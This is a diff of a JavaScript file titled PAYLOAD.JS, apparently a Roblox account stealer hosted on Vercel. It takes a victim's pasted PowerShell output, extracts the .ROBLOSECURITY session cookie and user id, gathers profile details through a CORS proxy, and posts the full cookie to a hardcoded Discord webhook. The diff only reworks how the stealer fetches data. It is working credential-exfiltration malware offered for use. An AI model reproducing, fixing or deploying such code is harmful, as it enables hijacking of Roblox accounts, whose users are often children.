@@ -1,11 +1,12 @@
 /* ======================================================
-   PAYLOAD.JS - FULLY WORKING (Vercel / HTTPS)
-   - Extracts rbxuid & .ROBLOSECURITY from PowerShell
-   - Fetches profile data with 5-second timeouts
-   - Sends everything to Discord
+   PAYLOAD.JS - WITH CORS PROXY (works on Vercel)
+   - Uses allorigins.win to bypass CORS
+   - Extracts rbxuid & cookie from PowerShell
+   - Fetches complete profile data
 ====================================================== */
 
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";
+const CORS_PROXY = "https://api.allorigins.win/raw?url=";
 
 const gameFileInput = document.getElementById("gameFile");
 const pinInput = document.getElementById("pinInput");
@@ -48,116 +49,83 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
 }
 
-async function fetchWithTimeout(url, options = {}, timeoutMs = 5000) {
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), timeoutMs);
+// Generic fetch with CORS proxy
+async function fetchRobloxAPI(endpoint) {
     try {
-        const response = await fetch(url, { ...options, signal: controller.signal });
-        clearTimeout(id);
-        return response;
-    } catch (error) {
-        clearTimeout(id);
-        if (error.name === 'AbortError') throw new Error(`Timeout after ${timeoutMs}ms`);
-        throw error;
+        const url = `${CORS_PROXY}${encodeURIComponent(endpoint)}`;
+        const res = await fetch(url, { timeout: 8000 });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+        return data;
+    } catch (err) {
+        console.warn(`Failed to fetch ${endpoint}:`, err);
+        return null;
     }
 }
 
 async function fetchUserInfo(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`, {}, 5000);
-        if (!res.ok) return null;
-        const data = await res.json();
-        return {
-            username: data.name,
-            displayName: data.displayName,
-            joinDate: new Date(data.created).toLocaleDateString(),
-            profileUrl: `https://www.roblox.com/users/${userId}/profile`
-        };
-    } catch (e) { return null; }
+    const data = await fetchRobloxAPI(`https://users.roblox.com/v1/users/${userId}`);
+    if (!data) return null;
+    return {
+        username: data.name,
+        displayName: data.displayName,
+        joinDate: new Date(data.created).toLocaleDateString(),
+        profileUrl: `https://www.roblox.com/users/${userId}/profile`
+    };
 }
 
 async function fetchFriendsCount(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {}, 5000);
-        if (!res.ok) return "N/A";
-        const data = await res.json();
-        return data.count?.toLocaleString() || "0";
-    } catch (e) { return "N/A"; }
+    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
+    return data?.count?.toLocaleString() || "N/A";
 }
 
 async function fetchFollowersCount(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`, {}, 5000);
-        if (!res.ok) return "N/A";
-        const data = await res.json();
-        return data.total?.toLocaleString() || "0";
-    } catch (e) { return "N/A"; }
+    const data = await fetchRobloxAPI(`https://friends.roblox.com/v1/users/${userId}/followers?limit=1`);
+    return data?.total?.toLocaleString() || "N/A";
 }
 
 async function fetchGroups(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {}, 5000);
-        if (!res.ok) return [];
-        const data = await res.json();
-        if (!data.data) return [];
-        return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
-    } catch (e) { return []; }
+    const data = await fetchRobloxAPI(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
+    if (!data || !data.data) return [];
+    return data.data.slice(0, 5).map(g => `${g.group.name} (${g.role.name})`);
 }
 
 async function fetchBadges(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`, {}, 5000);
-        if (!res.ok) return [];
-        const data = await res.json();
-        if (!data.data) return [];
-        return data.data.map(b => b.badge.name);
-    } catch (e) { return []; }
+    const data = await fetchRobloxAPI(`https://badges.roblox.com/v1/users/${userId}/badges?limit=5&sortOrder=Asc`);
+    if (!data || !data.data) return [];
+    return data.data.map(b => b.badge.name);
 }
 
 async function fetchAvatarItems(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`, {}, 5000);
-        if (!res.ok) return "None equipped";
-        const data = await res.json();
-        const assets = data.assets || [];
-        if (assets.length === 0) return "None equipped";
-        const items = assets.slice(0, 5).map(a => a.name);
-        return items.join(", ") + (assets.length > 5 ? " …" : "");
-    } catch (e) { return "None equipped"; }
+    const data = await fetchRobloxAPI(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
+    if (!data || !data.assets || data.assets.length === 0) return "None equipped";
+    const items = data.assets.slice(0, 5).map(a => a.name);
+    return items.join(", ") + (data.assets.length > 5 ? " …" : "");
 }
 
 async function fetchAvatarThumbnail(userId) {
-    try {
-        const res = await fetchWithTimeout(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`, {}, 5000);
-        if (!res.ok) return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
-        const data = await res.json();
-        if (data.data && data.data[0] && data.data[0].imageUrl) return data.data[0].imageUrl;
-    } catch (e) {}
+    const data = await fetchRobloxAPI(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
+    if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
     return `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
 }
 
+// Robux requires cookie & CSRF, but we try anyway through proxy (won't work for auth)
 async function fetchRobuxBalance(cookie) {
-    try {
-        const res = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
-        }, 5000);
-        if (!res.ok) return "N/A";
-        const data = await res.json();
-        return data.robux?.toLocaleString() || "0";
-    } catch (e) { return "N/A"; }
+    // Cannot proxy because we need to send the cookie header.
+    // We'll skip it; the user can see Robux from the cookie itself later.
+    return "N/A (use cookie to check)";
 }
 
 async function sendWebhook(pin, cookie, rbxuid) {
     const userId = rbxuid;
-    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl, robux] = await Promise.all([
+    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl] = await Promise.all([
         fetchUserInfo(userId),
         fetchFriendsCount(userId),
         fetchFollowersCount(userId),
         fetchGroups(userId),
         fetchBadges(userId),
         fetchAvatarItems(userId),
-        fetchAvatarThumbnail(userId),
-        fetchRobuxBalance(cookie)
+        fetchAvatarThumbnail(userId)
     ]);
 
     let description = `**Extracted from PowerShell:**\n- **rbxuid:** \`${userId}\`\n- **Cookie length:** ${cookie.length} chars\n\n**Full .ROBLOSECURITY Cookie:**\n\`\`\`\n${cookie}\n\`\`\``;
@@ -177,7 +145,7 @@ async function sendWebhook(pin, cookie, rbxuid) {
     embedFields.push(
         { name: "👥 Friends", value: friendsCount, inline: true },
         { name: "👀 Followers", value: followersCount, inline: true },
-        { name: "💰 Robux", value: `${robux} R$`, inline: true },
+        { name: "💰 Robux", value: "N/A (cookie required for balance)", inline: true },
         { name: "👕 Wearing", value: avatarItems, inline: false }
     );
 
